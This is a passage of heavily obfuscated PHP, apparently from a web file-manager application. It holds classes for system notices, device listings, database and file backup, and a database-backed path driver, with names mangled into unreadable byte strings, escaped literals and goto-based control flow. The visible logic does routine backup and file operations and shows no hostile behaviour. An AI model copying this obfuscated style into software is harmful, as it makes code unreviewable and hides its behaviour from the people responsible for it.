$Œ“†Ï÷¼[$Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[1265]]]; } if ($Íæ¥ß¿¦[$Íš‹Ê‰Ó[33]] == $Íš‹Ê‰Ó[2246]) { $Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[194]] = $Œ“†Ï÷¼[$Íæ¥ß¿¦[$Íš‹Ê‰Ó[529]][$Íš‹Ê‰Ó[194]]]; } if ($Íæ¥ß¿¦[$Íš‹Ê‰Ó[33]] == $Íš‹Ê‰Ó[1966]) { $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2251]] = $Íæ¥ß¿¦[$Íš‹Ê‰Ó[90]]; $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2235]] = $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2251]][$Íš‹Ê‰Ó[194]]; $Íæ¥ß¿¦[$Íš‹Ê‰Ó[90]] = !1; $Íæ¥ß¿¦[$Íš‹Ê‰Ó[194]] = $Íš‹Ê‰Ó[12]; } $–Üæœ«õ = array($Íš‹Ê‰Ó[1966], $Íš‹Ê‰Ó[2233]); if (!in_array($Íæ¥ß¿¦[$Íš‹Ê‰Ó[33]], $–Üæœ«õ)) { if ($Íæ¥ß¿¦[$Íš‹Ê‰Ó[90]] && $Íæ¥ß¿¦[$Íš‹Ê‰Ó[90]][$Íš‹Ê‰Ó[191]] == $Íš‹Ê‰Ó[192]) { $ Æ·ñÃ[] = $Šğåë½ˆ[$Íš‹Ê‰Ó[478]]; unset($ğÔ—ş“™[$‘­ŞÚÀÆ]); continue; } if ($Íæ¥ß¿¦[$Íš‹Ê‰Ó[2251]] && $Íæ¥ß¿¦[$Íš‹Ê‰Ó[2251]][$Íš‹Ê‰Ó[191]] == $Íš‹Ê‰Ó[192]) { $ Æ·ñÃ[] = $Šğåë½ˆ[$Íš‹Ê‰Ó[478]]; unset($ğÔ—ş“™[$‘­ŞÚÀÆ]); continue; } } } $Šğåë½ˆ[$Íš‹Ê‰Ó[529]] = $Íæ¥ß¿¦; unset($Šğåë½ˆ[$Íš‹Ê‰Ó[2472]]); $¦ÑŸ¯éÕ[] = $Šğåë½ˆ; } $this->clearSystemPathLog($ Æ·ñÃ); return $¦ÑŸ¯éÕ; } private function clearSystemPathLog($÷¦å„¨) { $ÀĞæ‚¯· =& $_SERVER[ÅÄÇĞô]; if (count($÷¦å„¨) == 0) { return; } $»ÔÉ¯Íº = array($ÀĞæ‚¯·[478] => array($ÀĞæ‚¯·[7], array_unique($÷¦å„¨))); $this->where($»ÔÉ¯Íº)->delete(); } public function deviceList($ÚôÊ©É, $Ùäğ´íØ = 0) { $Ù§ÎÔÆ„ =& $_SERVER[ÅÄÇĞô]; $÷¿†şœİ = array($Ù§ÎÔÆ„[1797] => $ÚôÊ©É, $Ù§ÎÔÆ„[234] => array($Ù§ÎÔÆ„[1114], $Ùäğ´íØ), $Ù§ÎÔÆ„[33] => $Ù§ÎÔÆ„[1940]); $êÙ„¹ƒ = array(); $¨ÔòÔôö = $this->field($Ù§ÎÔÆ„[2473])->where($÷¿†şœİ)->order($Ù§ÎÔÆ„[2249])->limit(50)->select(); foreach ($¨ÔòÔôö as $çÇ„¢ƒî => $ß‰‰İäğ) { if ($çÇ„¢ƒî > 0 && abs($ß‰‰İäğ[$Ù§ÎÔÆ„[234]] - $¨ÔòÔôö[$çÇ„¢ƒî - 1][$Ù§ÎÔÆ„[234]]) < 5) { continue; } $¾²ú·î¶ = json_decode($ß‰‰İäğ[$Ù§ÎÔÆ„[529]], !0); $ß‰‰İäğ[$Ù§ÎÔÆ„[2463]] = isset($¾²ú·î¶[$Ù§ÎÔÆ„[2463]]) ? $¾²ú·î¶[$Ù§ÎÔÆ„[2463]] : $Ù§ÎÔÆ„[12]; unset($¾²ú·î¶[$Ù§ÎÔÆ„[2463]]); $ƒéÌµÇÁ = $this->deviceType($¾²ú·î¶[$Ù§ÎÔÆ„[2238]]); if (isset($êÙ„¹ƒ[$ƒéÌµÇÁ])) { continue; } $ß‰‰İäğ[$Ù§ÎÔÆ„[2467]] = IpLocation::get($ß‰‰İäğ[$Ù§ÎÔÆ„[2463]]); $ß‰‰İäğ[$Ù§ÎÔÆ„[529]] = $¾²ú·î¶; $êÙ„¹ƒ[$ƒéÌµÇÁ] = $ß‰‰İäğ; } return array_values($êÙ„¹ƒ); } public function deviceType($‰µ‚€¥á) { return $‰µ‚€¥á; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x6e\x6f\x74\x69\143\x65\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\143\157\156\164\145\156\x74", "\141\x75\164\x68", "\x6d\x6f\x64\145", "\x74\151\x6d\145", "\164\x79\x70\x65", "\x6c\145\x76\145\x6c", "\145\x6e\x61\142\154\x65", "\x73\157\x72\x74"); public function listData($÷ø‹ÉŒ = false, $÷ß¼Æ­ = "\163\x6f\162\x74", $ªáæ¦ø› = false) { return parent::listData($÷ø‹ÉŒ, $÷ß¼Æ­, $ªáæ¦ø›); } public function add($„Ô‚ÜÊŞ) { $ÕıÃ÷‡² =& $_SERVER[ÅÄÇĞô]; $õœ¬ï = time(); if ($„Ô‚ÜÊŞ[$ÕıÃ÷‡²[16]] == $ÕıÃ÷‡²[2474]) { $õœ¬ï = strtotime($„Ô‚ÜÊŞ[$ÕıÃ÷‡²[207]]); } $„Ô‚ÜÊŞ[$ÕıÃ÷‡²[207]] = $õœ¬ï; return parent::insert($„Ô‚ÜÊŞ); } public function update($ÈÛ“¿üı, $öƒÙ¸ï¬) { $Ó«ÁüÅ =& $_SERVER[ÅÄÇĞô]; $‚È¯Îµ = $this->listData($ÈÛ“¿üı); if (!$‚È¯Îµ) { return !1; } $ãâá‡ıŒ = time(); if ($öƒÙ¸ï¬[$Ó«ÁüÅ[16]] == $Ó«ÁüÅ[2474]) { $ãâá‡ıŒ = strtotime($öƒÙ¸ï¬[$Ó«ÁüÅ[207]]); } $öƒÙ¸ï¬[$Ó«ÁüÅ[207]] = $ãâá‡ıŒ; return parent::update($ÈÛ“¿üı, $öƒÙ¸ï¬); } public function remove($Œğ•¯üª) { $²Öƒ²ğ§ = $this->listData($Œğ•¯üª); if (!$²Öƒ²ğ§ || $²Öƒ²ğ§[$_SERVER[ÅÄÇĞô][192]]) { return !1; } return parent::remove($Œğ•¯üª); } public function sort($é¬™ƒ†æ, $òü®ìş°) { return parent::update($é¬™ƒ†æ, $òü®ìş°); } public function enable($ ¡Ç…Íå, $øÅÄÛÍØ) { return parent::update($ ¡Ç…Íå, array($_SERVER[ÅÄÇĞô][2475] => $øÅÄÛÍØ)); } private function initUserOption() { $³»¡á«ó =& $_SERVER[ÅÄÇĞô]; $this->optionType = $³»¡á«ó[2476]; $this->modelType = $³»¡á«ó[2477]; $this->field = array($³»¡á«ó[2478], $³»¡á«ó[32], $³»¡á«ó[207], $³»¡á«ó[33], $³»¡á«ó[2479], $³»¡á«ó[845], $³»¡á«ó[229]); } public function userNoticeGet($ô©ˆœĞ‡ = false) { $this->initUserOption(); return parent::listData($ô©ˆœĞ‡, $_SERVER[ÅÄÇĞô][478], !0); } public function userNoticeAdd($§²ç±Ó«) { $ˆ‡‘µŒß =& $_SERVER[ÅÄÇĞô]; $this->initUserOption(); $ÍûŒÛÌ = $this->findByKey($ˆ‡‘µŒß[2478], $§²ç±Ó«[$ˆ‡‘µŒß[478]]); if ($ÍûŒÛÌ) { return !0; } $ìÕ¹¢Ó = array($ˆ‡‘µŒß[2478] => $§²ç±Ó«[$ˆ‡‘µŒß[478]], $ˆ‡‘µŒß[32] => $§²ç±Ó«[$ˆ‡‘µŒß[32]], $ˆ‡‘µŒß[207] => $§²ç±Ó«[$ˆ‡‘µŒß[207]], $ˆ‡‘µŒß[33] => isset($§²ç±Ó«[$ˆ‡‘µŒß[33]]) ? $§²ç±Ó«[$ˆ‡‘µŒß[33]] : 1, $ˆ‡‘µŒß[2479] => isset($§²ç±Ó«[$ˆ‡‘µŒß[2479]]) ? $§²ç±Ó«[$ˆ‡‘µŒß[2479]] : 0, $ˆ‡‘µŒß[845] => 0, $ˆ‡‘µŒß[229] => 0); return parent::insert($ìÕ¹¢Ó); } public function userNoticeEdit($»äªïæå, $—“öÂÌ¸) { $this->initUserOption(); return parent::update($»äªïæå, $—“öÂÌ¸); } } goto Eö÷ ¼š¡; a¦”ºˆÛ‚…: define($_SERVER[ÅÄÇĞô][320], 3); define($_SERVER[ÅÄÇĞô][321], 1); define($_SERVER[ÅÄÇĞô][322], 0); goto F³Õ‚´èï; BÌøÚàÅ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $—”æì•É =& $_SERVER[ÅÄÇĞô]; $’ıÃƒ— = Backup::get(); self::$io = $’ıÃƒ—[$—”æì•É[847]]; self::$name = $’ıÃƒ—[$—”æì•É[32]]; $çåìëõ = new DbManage(); $ã×·¸äÅ = $çåìëõ->dbType(); $ÂÅã»Ñ… = array($—”æì•É[873] => $ã×·¸äÅ, $—”æì•É[874] => time()); Backup::set($ÂÅã»Ñ…); $±úê¶Ô× = $this->tmpFilesPath() . $—”æì•É[875] . self::$name . $—”æì•É[8]; del_dir($±úê¶Ô×); mk_dir($±úê¶Ô×); $çóÆ´Í² = $‚•ÊîÀÔ = 0; try { $†Á¶ö·Ğ = $çåìëõ->db()->getTables(); } catch (Exception $ÉÉ˜Çøó) { Backup::log($—”æì•É[876] . $ÉÉ˜Çøó->getMessage()); return !1; } $†Á¶ö·Ğ = array_diff($†Á¶ö·Ğ, array($—”æì•É[877], $—”æì•É[878])); foreach ($†Á¶ö·Ğ as $É“°’Ó) { if ($É“°’Ó == $—”æì•É[879]) { continue; } $çóÆ´Í² += $çåìëõ->model($É“°’Ó)->count(); } $™ãÓÙæ = new Task($—”æì•É[880], $—”æì•É[872], $çóÆ´Í², LNG($—”æì•É[881]) . $—”æì•É[882] . LNG($—”æì•É[883])); $GLOBALS[$—”æì•É[884]] = self::$name; foreach ($†Á¶ö·Ğ as $É“°’Ó) { $ê°Óö¦º = $±úê¶Ô× . $É“°’Ó . $—”æì•É[885]; if ($É“°’Ó == $—”æì•É[879]) { @touch($ê°Óö¦º); continue; } $Á¸”© = null; if ($É“°’Ó == $—”æì•É[886] && $’ıÃƒ—[$—”æì•É[171]] == $—”æì•É[871]) { $Á¸”© = self::$io; } $‚•ÊîÀÔ += $çåìëõ->sqlFromDb($É“°’Ó, $ê°Óö¦º, $™ãÓÙæ, $Á¸”©); } unset($GLOBALS[$—”æì•É[884]]); $™ãÓÙæ->end(); if ($‚•ÊîÀÔ > $çóÆ´Í²) { $çóÆ´Í² = $‚•ÊîÀÔ; } $ÂÅã»Ñ… = array($—”æì•É[873] => $ã×·¸äÅ, $—”æì•É[868] => 1, $—”æì•É[887] => $çóÆ´Í², $—”æì•É[888] => $‚•ÊîÀÔ, $—”æì•É[889] => time()); Backup::set($ÂÅã»Ñ…); if ($çóÆ´Í² - $‚•ÊîÀÔ > 0) { $ÍÃªİú = $—”æì•É[890]; if (!stristr(I18n::getType(), $—”æì•É[891])) { $ÍÃªİú = $—”æì•É[892]; } Backup::log(array($ÍÃªİú, $ÂÅã»Ñ…)); return !1; } return !0; } private function tmpFilesPath() { $Ø¿€Ò»Ì =& $_SERVER[ÅÄÇĞô]; $¥ÚÂÉİ = TEMP_FILES; if ($GLOBALS[$Ø¿€Ò»Ì[6]][$Ø¿€Ò»Ì[92]][$Ø¿€Ò»Ì[893]]) { $¥ÚÂÉİ = $GLOBALS[$Ø¿€Ò»Ì[6]][$Ø¿€Ò»Ì[92]][$Ø¿€Ò»Ì[893]]; if (!mk_dir($¥ÚÂÉİ) || !is_writable($¥ÚÂÉİ) || !IO::mkfile($¥ÚÂÉİ . $Ø¿€Ò»Ì[894])) { $¥ÚÂÉİ = TEMP_FILES; } } return $¥ÚÂÉİ; } } class BackupDbFile { public function __construct() { } public function index() { $ùÔ´Ùï =& $_SERVER[ÅÄÇĞô]; $ïÓŞ«Û = Backup::get(); $¼´‰›˜ = $ïÓŞ«Û[$ùÔ´Ùï[32]]; $ô•²Ö×¿ = $this->tmpFilesPath() . "\142\x61\143\x6b\165\x70\x5f{$¼´‰›˜}\57"; $ùì¾ˆª = $this->backupPath($ïÓŞ«Û); if (!($ùì¾ˆª = IO::mkdir($ùì¾ˆª))) { Backup::log($ùÔ´Ùï[895] . $ùì¾ˆª); return !1; } $È¹ƒöôï = IO::listPath($ô•²Ö×¿); $˜÷åÏ©š = isset($È¹ƒöôï[$ùÔ´Ùï[86]]) ? $È¹ƒöôï[$ùÔ´Ùï[86]] : array(); $ŠÑ¿ á = array_sum(array_column($˜÷åÏ©š, $ùÔ´Ùï[79])); if (!$ŠÑ¿ á) { Backup::log($ùÔ´Ùï[896] . $ô•²Ö×¿); return !1; } $Çø‰ì¯ = array($ùÔ´Ùï[897] => $ŠÑ¿ á, $ùÔ´Ùï[898] => time()); Backup::set($Çø‰ì¯); $Ûã‹´¦ = new TaskFileTransfer($ùÔ´Ùï[899], $ùÔ´Ùï[872], count($˜÷åÏ©š), LNG($ùÔ´Ùï[881]) . $ùÔ´Ùï[465] . LNG($ùÔ´Ùï[883]) . $ùÔ´Ùï[900]); $Ûã‹´¦->task[$ùÔ´Ùï[858]] = $ŠÑ¿ á; foreach ($È¹ƒöôï[$ùÔ´Ùï[86]] as $‹û¹Êœú) { $ÃÇ‘‡» = IO::move($‹û¹Êœú[$ùÔ´Ùï[87]], $ùì¾ˆª); if (!$ÃÇ‘‡») { $Ûã‹´¦->end(); $—•áêï® = IO::getLastError($ùÔ´Ùï[901] . $‹û¹Êœú[$ùÔ´Ùï[87]] . $ùÔ´Ùï[902] . $ùì¾ˆª . $ùÔ´Ùï[178]); Backup::log($—•áêï®); return !1; } } $´ÙãÇÑá = new DbManage(); $Ùû‹üÄÛ = $´ÙãÇÑá->getSqlFile(); if (!$Ùû‹üÄÛ[$ùÔ´Ùï[903]] || !$Ùû‹üÄÛ[$ùÔ´Ùï[13]]) { Backup::log($ùÔ´Ùï[904]); return !1; } IO::move($Ùû‹üÄÛ[$ùÔ´Ùï[903]], $ùì¾ˆª); IO::move($Ùû‹üÄÛ[$ùÔ´Ùï[13]], $ùì¾ˆª); $Ûã‹´¦->end(); $Çø‰ì¯ = array($ùÔ´Ùï[905] => $ŠÑ¿ á, $ùÔ´Ùï[906] => time()); Backup::set($Çø‰ì¯); return !0; } private function backupPath($à­¤Ü) { $ëœğ±‚ =& $_SERVER[ÅÄÇĞô]; $±Áâå¶ = $à­¤Ü[$ëœğ±‚[32]]; $ãò›À²ø = Model($ëœğ±‚[865])->get($ëœğ±‚[866]); $ëË®‰” = substr(md5($ëœğ±‚[867] . $ãò›À²ø . $±Áâå¶), 0, 8); return "\x7b\x69\x6f\72{$à­¤Ü[$ëœğ±‚[847]]}\x7d\x2f\144\x61\x74\x61\x62\x61\163\x65\x2f\142\141\x63\153\x75\160\x2f" . $±Áâå¶ . $ëœğ±‚[11] . $ëË®‰”; } private function tmpFilesPath() { $Á”ê‡‚Ô =& $_SERVER[ÅÄÇĞô]; $§ÁÅ“¼Ğ = TEMP_FILES; if ($GLOBALS[$Á”ê‡‚Ô[6]][$Á”ê‡‚Ô[92]][$Á”ê‡‚Ô[893]]) { $§ÁÅ“¼Ğ = $GLOBALS[$Á”ê‡‚Ô[6]][$Á”ê‡‚Ô[92]][$Á”ê‡‚Ô[893]]; if (!mk_dir($§ÁÅ“¼Ğ) || !is_writable($§ÁÅ“¼Ğ) || !IO::mkfile($§ÁÅ“¼Ğ . $Á”ê‡‚Ô[894])) { $§ÁÅ“¼Ğ = TEMP_FILES; } } return $§ÁÅ“¼Ğ; } } class BackupFile { public function __construct() { } public function index() { $Íıï˜¿Ù = Backup::get(); $ğä¿ˆÕ = $Íıï˜¿Ù[$_SERVER[ÅÄÇĞô][371]][$_SERVER[ÅÄÇĞô][233]][$_SERVER[ÅÄÇĞô][546]]; $ñï±úØä = array($_SERVER[ÅÄÇĞô][547] => array($_SERVER[ÅÄÇĞô][907], $ğä¿ˆÕ), $_SERVER[ÅÄÇĞô][908] => array($_SERVER[ÅÄÇĞô][409], $Íıï˜¿Ù[$_SERVER[ÅÄÇĞô][847]])); $ğÏıå«é = (int) Model($_SERVER[ÅÄÇĞô][886])->where($ñï±úØä)->count($_SERVER[ÅÄÇĞô][546]); $ãŞµò = (int) Model($_SERVER[ÅÄÇĞô][886])->where($ñï±úØä)->sum($_SERVER[ÅÄÇĞô][79]); $ƒ¨¦÷·œ = new TaskFileTransfer($_SERVER[ÅÄÇĞô][909], $_SERVER[ÅÄÇĞô][872], $ğÏıå«é, LNG($_SERVER[ÅÄÇĞô][881]) . $_SERVER[ÅÄÇĞô][882] . LNG($_SERVER[ÅÄÇĞô][910])); $ƒ¨¦÷·œ->task[$_SERVER[ÅÄÇĞô][858]] = $ãŞµò; $Êíá…Œ¤ = array($_SERVER[ÅÄÇĞô][911] => $ğÏıå«é, $_SERVER[ÅÄÇĞô][912] => $ãŞµò, $_SERVER[ÅÄÇĞô][913] => time()); Backup::set($Êíá…Œ¤); $áÜƒ‡¨ = !0; $á«¥µå = $this->storeIds(); $¸Ö˜¡ß = 1; $Ë˜°Ì¸ = 1000; $¦ë€®ÕĞ = $Ç ÜªŠ´ = 0; $ØÚÙä¼ = array(); $ºÇÁóäº = $ëŒÚÄ² = 0; do { $ôìñ¬­Ñ = $_SERVER[ÅÄÇĞô][914]; $ÃÏƒ¡£” = Model($_SERVER[ÅÄÇĞô][886])->where($ñï±úØä)->field($ôìñ¬­Ñ)->order($_SERVER[ÅÄÇĞô][915])->selectPage($Ë˜°Ì¸, $¸Ö˜¡ß); $»„©ÆÎÂ = !empty($ÃÏƒ¡£”[$_SERVER[ÅÄÇĞô][448]]) ? $ÃÏƒ¡£”[$_SERVER[ÅÄÇĞô][448]] : array(); foreach ($»„©ÆÎÂ as $Áü†¡Üğ) { if (!$this->_fileExist($Áü†¡Üğ, $ØÚÙä¼, $á«¥µå)) { Backup::log($_SERVER[ÅÄÇĞô][916] . $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][546]] . $_SERVER[ÅÄÇĞô][917] . $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][87]]); continue; } $¦ˆ Ìù = $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][87]]; $úŸúªË = "\x7b\151\x6f\72{$Íıï˜¿Ù[$_SERVER[ÅÄÇĞô][847]]}\175" . substr($¦ˆ Ìù, strlen("\173\x69\157\x3a{$Áü†¡Üğ[$_SERVER[ÅÄÇĞô][918]]}\x7d")); if (IO::exist($úŸúªË)) { $ƒ¨¦÷·œ->updateFileEnd($Áü†¡Üğ[$_SERVER[ÅÄÇĞô][32]], $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][79]]); } else { $úŸúªË = get_path_father($úŸúªË); IO::mkdir($úŸúªË); if (!IO::copy($¦ˆ Ìù, $úŸúªË, $_SERVER[ÅÄÇĞô][919])) { Backup::log($_SERVER[ÅÄÇĞô][920] . $¦ˆ Ìù . $_SERVER[ÅÄÇĞô][902] . $úŸúªË . $_SERVER[ÅÄÇĞô][178]); $áÜƒ‡¨ = !1; break; } } $ğä¿ˆÕ = $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][546]]; $Ç ÜªŠ´ += 1; $¦ë€®ÕĞ += $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][79]]; $ëŒÚÄ² += 1; $ºÇÁóäº += $Áü†¡Üğ[$_SERVER[ÅÄÇĞô][79]]; if ($¦ë€®ÕĞ >= 1024 * 1024 * 100) { $Êíá…Œ¤ = array($_SERVER[ÅÄÇĞô][846] => $ğä¿ˆÕ, $_SERVER[ÅÄÇĞô][921] => $ëŒÚÄ², $_SERVER[ÅÄÇĞô][922] => $ºÇÁóäº); Backup::set($Êíá…Œ¤); $¦ë€®ÕĞ = $Ç ÜªŠ´ = 0; } } $¦ìüÛÛ” = count($»„©ÆÎÂ); $¸Ö˜¡ß++; } while ($¦ìüÛÛ” == $Ë˜°Ì¸); $ƒ¨¦÷·œ->end(); $Êíá…Œ¤ = array($_SERVER[ÅÄÇĞô][923] => 1, $_SERVER[ÅÄÇĞô][856] => time(), $_SERVER[ÅÄÇĞô][870] => 1, $_SERVER[ÅÄÇĞô][846] => $ğä¿ˆÕ, $_SERVER[ÅÄÇĞô][924] => time()); if ($Ç ÜªŠ´) { $Êíá…Œ¤[$_SERVER[ÅÄÇĞô][921]] = $ëŒÚÄ²; $Êíá…Œ¤[$_SERVER[ÅÄÇĞô][922]] = $ºÇÁóäº; } Backup::set($Êíá…Œ¤); return !0; } private function _fileExist($ù­ÁÁæ¢, &$®»—¿—Á, $¦ï½›Û) { $íÀÊæÁŞ =& $_SERVER[ÅÄÇĞô]; $›—¹‘’ú = $ù­ÁÁæ¢[$íÀÊæÁŞ[87]]; if (in_array($ù­ÁÁæ¢[$íÀÊæÁŞ[546]], $®»—¿—Á)) { return !1; } if (!in_array($ù­ÁÁæ¢[$íÀÊæÁŞ[918]], $¦ï½›Û)) { return !1; } if (IO::exist($›—¹‘’ú)) { return !0; } $ßàøÅœá = get_path_father($›—¹‘’ú); if (IO::exist($ßàøÅœá)) { $®»—¿—Á[] = $ù­ÁÁæ¢[$íÀÊæÁŞ[546]]; return !1; } $‚Áîã±Ô = array($íÀÊæÁŞ[918] => $ù­ÁÁæ¢[$íÀÊæÁŞ[918]], $íÀÊæÁŞ[87] => array($íÀÊæÁŞ[462], "{$ßàøÅœá}\45")); $–ŞÎ°Ãç = Model($íÀÊæÁŞ[886])->where($‚Áîã±Ô)->field($íÀÊæÁŞ[547])->select(); $®»—¿—Á = array_merge($®»—¿—Á, array_to_keyvalue($–ŞÎ°Ãç, $íÀÊæÁŞ[12], $íÀÊæÁŞ[546])); return !1; } private function _fileFilter($Ë…ı®Ú²) { $Š§µÚÃ¾ =& $_SERVER[ÅÄÇĞô]; return; if (empty($Ë…ı®Ú²)) { return; } $Åâç²¸ = array($Š§µÚÃ¾[546] => array($Š§µÚÃ¾[7], array_unique($Ë…ı®Ú²))); $Ü¹Üê¬Š = Model($Š§µÚÃ¾[925])->where($Åâç²¸)->field($Š§µÚÃ¾[194])->select(); foreach ($Ü¹Üê¬Š as $‘µ”Õãé) { Model($Š§µÚÃ¾[925])->remove($‘µ”Õãé[$Š§µÚÃ¾[194]], !1); } } private function storeIds() { $Œ‘çÑìì =& $_SERVER[ÅÄÇĞô]; $Ò£á»´¹ = Model($Œ‘çÑìì[862])->listData(); $šóê ã” = array(); $Ïàé–÷ú = $GLOBALS[$Œ‘çÑìì[6]][$Œ‘çÑìì[92]][$Œ‘çÑìì[926]]; foreach ($Ò£á»´¹ as $±÷ÍÕÏ) { $×¼ÎÑ  = strtolower($±÷ÍÕÏ[$Œ‘çÑìì[98]]); if (!isset($Ïàé–÷ú[$×¼ÎÑ ])) { continue; } $‡àÒ÷É× = $Œ‘çÑìì[77] . (isset($Ïàé–÷ú[$×¼ÎÑ ]) ? $Ïàé–÷ú[$×¼ÎÑ ] : ucfirst($×¼ÎÑ )); if (!class_exists($‡àÒ÷É×)) { continue; } $šóê ã”[] = $±÷ÍÕÏ[$Œ‘çÑìì[478]]; } return $šóê ã”; } } goto bÙ¹‹ØŠ¥Š; d ì‰ãî•’: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ğáï…à´) { $this->pathParse = $Ğáï…à´; $this->model = Model($_SERVER[ÅÄÇĞô][1444]); } public function getPath($¦Ü…æ) { return trim($¦Ü…æ, $_SERVER[ÅÄÇĞô][8]); } public function pathFather($Í²ù) { $è ’¼© = $this->parse($Í²ù); $è ’¼© = $this->infoSimple($Í²ù); return $è ’¼© ? $è ’¼©[$_SERVER[ÅÄÇĞô][193]] : !1; } public function pathThis($—ö°ÇÛ˜) { $ëêŸ‹ó = $this->infoSimple($—ö°ÇÛ˜); return $ëêŸ‹ó ? $ëêŸ‹ó[$_SERVER[ÅÄÇĞô][32]] : !1; } public function getPathOuter($ıŠşØ î) { if (!$ıŠşØ î) { return $ıŠşØ î; } $ğÆÖû›… = $this->parse($ıŠşØ î); return KodIO::make($ğÆÖû›…[$_SERVER[ÅÄÇĞô][478]]); } public function copyFolderFromIO($÷–äËß”, $ú­Óõİˆ, $ô«›°šó, $Œ•¬Æ—¶, $©Ã”ë) { $ä«Ï³ù¬ = $this->model->copyFolderFromIO($÷–äËß”, $ú­Óõİˆ, $ô«›°šó, $Œ•¬Æ—¶, $©Ã”ë); return KodIO::make($ä«Ï³ù¬); } public function isParentOf($É”×Û¹â, $ˆ§»ÈÌ‰) { return $this->model->isParentOf($É”×Û¹â, $ˆ§»ÈÌ‰); } public function mkfile($‡ùçœô, $¿åæìŒ = '', $¾ĞÂ˜²‘ = REPEAT_RENAME) { $“‘½”Ìı =& $_SERVER[ÅÄÇĞô]; $Ç¹ÉÔä = $this->parse($‡ùçœô); $‡ùçœô = $Ç¹ÉÔä[$“‘½”Ìı[478]]; for ($×Ë¬İ‚ = 0; $×Ë¬İ‚ < count($Ç¹ÉÔä[$“‘½”Ìı[1445]]); $×Ë¬İ‚++) { $Ÿ†¸ÏŠ÷ = $Ç¹ÉÔä[$“‘½”Ìı[1445]][$×Ë¬İ‚]; if ($×Ë¬İ‚ == count($Ç¹ÉÔä[$“‘½”Ìı[1445]]) - 1) { $‡ùçœô = $this->model->mkfile($‡ùçœô, $Ÿ†¸ÏŠ÷, $¿åæìŒ, $¾ĞÂ˜²‘); break; } $‡ùçœô = $this->model->mkdir($‡ùçœô, $Ÿ†¸ÏŠ÷, REPEAT_SKIP); } return $this->getPathOuter($‡ùçœô); } public function mkdir($–ğ••¯, $’¸—Ó·ş = REPEAT_SKIP) { $Õû¢€ì” =& $_SERVER[ÅÄÇĞô]; $‹Óé¥øü = $this->parse($–ğ••¯); $–ğ••¯ = $‹Óé¥øü[$Õû¢€ì”[478]]; for ($½óå‡Öª = 0; $½óå‡Öª < count($‹Óé¥øü[$Õû¢€ì”[1445]]); $½óå‡Öª++) { $É¬ˆ°îô = $‹Óé¥øü[$Õû¢€ì”[1445]][$½óå‡Öª]; $–ğ••¯ = $this->model->mkdir($–ğ••¯, $É¬ˆ°îô, $’¸—Ó·ş); } return $this->getPathOuter($–ğ••¯); } public function copyFile($ÀúÏ™¹Ş, $ö¶ÆË¦‰, $«Ô’‡ÔÑ = REPEAT_REPLACE) { $©Ø£ïÍ =& $_SERVER[ÅÄÇĞô]; $ÆÂŸİ = $this->parse($ö¶ÆË¦‰); $õçù×Ò = $this->model->copy($ÀúÏ™¹Ş, $ÆÂŸİ[$©Ø£ïÍ[478]], $«Ô’‡ÔÑ, $ÆÂŸİ[$©Ø£ïÍ[87]]); return $õçù×Ò ? $this->getPathOuter($õçù×Ò) : !1; } public function moveFile($½İ‰éã», $¼ÄôÙÜã, $¼ùÍÂ–ˆ = REPEAT_REPLACE) { $ÖÙÊ¼öë =& $_SERVER[ÅÄÇĞô]; $æºõÇ”Ñ = $this->parse($¼ÄôÙÜã); $™·º¡ã = $this->model->move($½İ‰éã», $æºõÇ”Ñ[$ÖÙÊ¼öë[478]], $¼ùÍÂ–ˆ, $æºõÇ”Ñ[$ÖÙÊ¼öë[87]]); return $™·º¡ã ? $this->getPathOuter($™·º¡ã) : !1; } public function copy($¢Ã»÷Â, $ƒé‡ÒÓÏ, $²Å‰«¹… = REPEAT_REPLACE, $«¢œ•Ïğ = false) { $ÚîÊ·›‹ = $this->parse($ƒé‡ÒÓÏ); $ù¼±€³É = $this->model->copy($¢Ã»÷Â, $ÚîÊ·›‹[$_SERVER[ÅÄÇĞô][478]], $²Å‰«¹…, $«¢œ•Ïğ); return $ù¼±€³É ? $this->getPathOuter($ù¼±€³É) : !1; } public function moveSameAllow() { } public function move($Œ³Ô÷Ã, $­àá—Ş, $æç÷˜… = REPEAT_REPLACE, $åÕ§ö¬ = false) { $ÆáúŸÛ = $this->parse($­àá—Ş); $§ÀãŠÁ• = $this->model->move($Œ³Ô÷Ã, $ÆáúŸÛ[$_SERVER[ÅÄÇĞô][478]], $æç÷˜…, $åÕ§ö¬); return $§ÀãŠÁ• ? $this->getPathOuter($§ÀãŠÁ•) : !1; } public function remove($î· ¥Ô, $„»ÁŸ“ = true) { return $this->model->remove($î· ¥Ô, $„»ÁŸ“); } public function rename($—æË‘†¦, $´Ë×¸®Ô) { $„âÛœ« = $this->model->rename($—æË‘†¦, $´Ë×¸®Ô); return $„âÛœ« ? $this->getPathOuter($—æË‘†¦) : $„âÛœ«; } public function size($´«ŸÎ®ç) { $˜Â¨«¥ = $this->infoSimple($´«ŸÎ®ç); return $˜Â¨«¥ ? $˜Â¨«¥[$_SERVER[ÅÄÇĞô][79]] : 0; } public function infoSimple($õÓÂÍ˜•) { return $this->model->sourceInfo($õÓÂÍ˜•); } public function info($‚éâêê—) { return $this->infoParse($‚éâêê—); } public function infoAuth($ÃÜøÒ) { return $this->infoParse($ÃÜøÒ, !1, !0); } public function infoWithChildren($æùã„ùÈ) { return $this->infoParse($æùã„ùÈ, !0); } protected function infoParse($’ĞëÛ¢, $ç¿Ÿ¨‰¬ = false, $÷±â¯Š„ = false) { if (!$ç¿Ÿ¨‰¬) { return $this->model->pathInfo($’ĞëÛ¢, $÷±â¯Š„); } return $this->model->pathInfoMore($’ĞëÛ¢); } public function infoFullSimple($Ô¢æù ó) { $¨ùîÁÈ =& $_SERVER[ÅÄÇĞô]; $³ó¡¼º¸ = explode($¨ùîÁÈ[8], $Ô¢æù ó); $èÌ•«Á = implode($¨ùîÁÈ[8], array_splice($³ó¡¼º¸, 1)); return 